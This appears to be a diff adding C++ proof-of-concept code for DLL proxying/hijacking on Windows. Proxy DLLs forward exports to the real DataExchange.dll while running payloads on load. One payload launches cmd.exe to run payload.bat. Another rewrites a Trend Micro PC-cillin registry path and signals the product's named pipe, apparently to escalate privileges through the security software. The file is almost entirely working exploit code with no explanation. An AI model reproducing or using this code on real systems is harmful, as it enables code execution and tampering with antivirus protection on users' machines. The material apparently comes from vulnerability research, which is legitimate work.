@@ -109,3 +109,236 @@ extern "C" __declspec(dllexport) void exportedFunction3(int a)
     if (real_exportedFunction3)
         real_exportedFunction3(a);
 }
+....
+
+
+
+#include <windows.h>
+#include "pch.h"
+
+// Path to real DLL
+#define ORIGINAL_DLL_PATH L"C:\\Windows\\System32\\dataexchange.dll"
+
+FARPROC LoadOriginalFunction(LPCSTR funcName) {
+    static HMODULE hReal = nullptr;
+    if (!hReal) {
+        hReal = LoadLibraryW(ORIGINAL_DLL_PATH);
+        if (!hReal) {
+            MessageBoxA(NULL, "Failed to load real DLL", "Proxy DLL", MB_OK);
+            return NULL;
+        }
+    }
+    return GetProcAddress(hReal, funcName);
+}
+
+extern "C" __declspec(dllexport)
+HRESULT __stdcall DllCanUnloadNow() {
+    typedef HRESULT(__stdcall* Fn)();
+    Fn realFn = (Fn)LoadOriginalFunction("DllCanUnloadNow");
+    return realFn ? realFn() : E_FAIL;
+}
+
+extern "C" __declspec(dllexport)
+HRESULT __stdcall DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
+    typedef HRESULT(__stdcall* Fn)(REFCLSID, REFIID, LPVOID*);
+    Fn realFn = (Fn)LoadOriginalFunction("DllGetClassObject");
+    return realFn ? realFn(rclsid, riid, ppv) : E_FAIL;
+}
+
+extern "C" __declspec(dllexport)
+HRESULT __stdcall DllGetActivationFactory(void* classId, void** factory) {
+    typedef HRESULT(__stdcall* Fn)(void*, void**);
+    Fn realFn = (Fn)LoadOriginalFunction("DllGetActivationFactory");
+    return realFn ? realFn(classId, factory) : E_FAIL;
+}
+
+// Optional payload
+DWORD WINAPI PayloadThread(LPVOID) {
+    MessageBoxA(NULL, "Payload triggered inside proxy DLL", "iframe.dll", MB_OK);
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
+    }
+    return TRUE;
+}
+
+...........
+
+
+
+
+// tmtestpipe.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include <windows.h>
+#include <iostream>
+
+
+int main() {
+    const char* proxyDllPath = "C:\\poc\\consoletestapp.dll";  // Your proxy DLL path
+    HMODULE hProxyDll = LoadLibraryA(proxyDllPath);
+
+    if (!hProxyDll) {
+        std::cerr << "Failed to load Proxy DLL. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    std::cout << "Proxy DLL loaded successfully!\n";
+
+    // You can now test exported functions
+    
+    FreeLibrary(hProxyDll);
+    return 0;
+}
+...............
+
+consoletestapp.cpp
+
+
+
+#pragma once
+// BEGIN: export directives for the linker
+#pragma comment(linker,"/export:DllCanUnloadNow=DataExchange_orig.DllCanUnloadNow,@1")
+#pragma comment(linker,"/export:DllGetActivationFactory=DataExchange_orig.DllGetActivationFactory,@2")
+#pragma comment(linker,"/export:DllGetClassObject=DataExchange_orig.DllGetClassObject,@3")
+
+
+// END: export directives for the linker
+
+#include <windows.h>
+#include <string>
+#include <atlstr.h>  
+
+CStringW ThisDllDirPath()
+{
+    CStringW thisPath = L"";
+    WCHAR path[MAX_PATH];
+    HMODULE hm;
+    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPWSTR)&ThisDllDirPath, &hm))
+    {
+        GetModuleFileNameW(hm, path, sizeof(path));
+        PathRemoveFileSpecW(path);
+        thisPath = CStringW(path);
+        if (!thisPath.IsEmpty() &&
+            thisPath.GetAt(thisPath.GetLength() - 1) != '\\')
+            thisPath += L"\\";
+    }
+    return thisPath;
+}
+
+int Exploit()
+{
+    // Create the command line 
+    std::wstring fullpath(TEXT("cmd.exe /C \""));
+    fullpath += ThisDllDirPath();
+    fullpath += std::wstring(TEXT("payload.bat\""));
+    TCHAR* fullpathwc = (wchar_t*)fullpath.c_str();
+
+    // Start a new process using the command line 
+    STARTUPINFO info = { sizeof(info) };
+    PROCESS_INFORMATION processInfo;
+    CreateProcess(NULL, fullpathwc, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &processInfo);
+
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        Exploit();
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+
+................
+
+#pragma once
+
+// Export forwarding
+#pragma comment(linker, "/export:DllCanUnloadNow=DataExchange_orig.DllCanUnloadNow,@1")
+#pragma comment(linker, "/export:DllGetActivationFactory=DataExchange_orig.DllGetActivationFactory,@2")
+#pragma comment(linker, "/export:DllGetClassObject=DataExchange_orig.DllGetClassObject,@3")
+
+#include <windows.h>
+
+// Global handle for the real/original DLL
+HMODULE g_hOriginalDll = NULL;
+
+// Load the original system DLL
+void LoadOriginalDll()
+{
+    if (!g_hOriginalDll)
+    {
+        WCHAR systemPath[MAX_PATH];
+        GetSystemDirectoryW(systemPath, MAX_PATH);
+
+        wcscat_s(systemPath, L"\\DataExchange.dll");
+
+        g_hOriginalDll = LoadLibraryW(systemPath);
+    }
+}
+
+// Our payload logic
+DWORD WINAPI RunPayload(LPVOID lpParam)
+{
+    // 1. Modify Registry
+    HKEY hKey;
+    LPCWSTR subkey = L"SOFTWARE\\WOW6432Node\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion";
+    LPCWSTR valueName = L"Application Path";
+    LPCWSTR valueData = L"C:\\poc\\AAAA";
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, (DWORD)((wcslen(valueData) + 1) * sizeof(wchar_t)));
+        RegCloseKey(hKey);
+    }
+
+    // 2. Send message to named pipe
+    HANDLE hPipe = CreateFileW(
+        L"\\\\.\\pipe\\TMLISTEN_PIPE_2218EBAB_63F8_49E4_930C_AF69E77928AF",
+        GENERIC_WRITE,
+        0,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    if (hPipe != INVALID_HANDLE_VALUE)
+    {
+        const char* message = "ping\n";
+        DWORD written;
+        WriteFile(hPipe, message, (DWORD)strlen(message), &written, nullptr);
+        CloseHandle(hPipe);
+    }
+
+    return 0;
+}
+
+// DLL Entry Point
+BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
+{
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
+        LoadOriginalDll(); // Always load original DLL
+        DisableThreadLibraryCalls(hInstance); // optimization
+        CreateThread(NULL, 0, RunPayload, NULL, 0, NULL); // safe payload thread
+    }
+    return TRUE;
+}
+
+
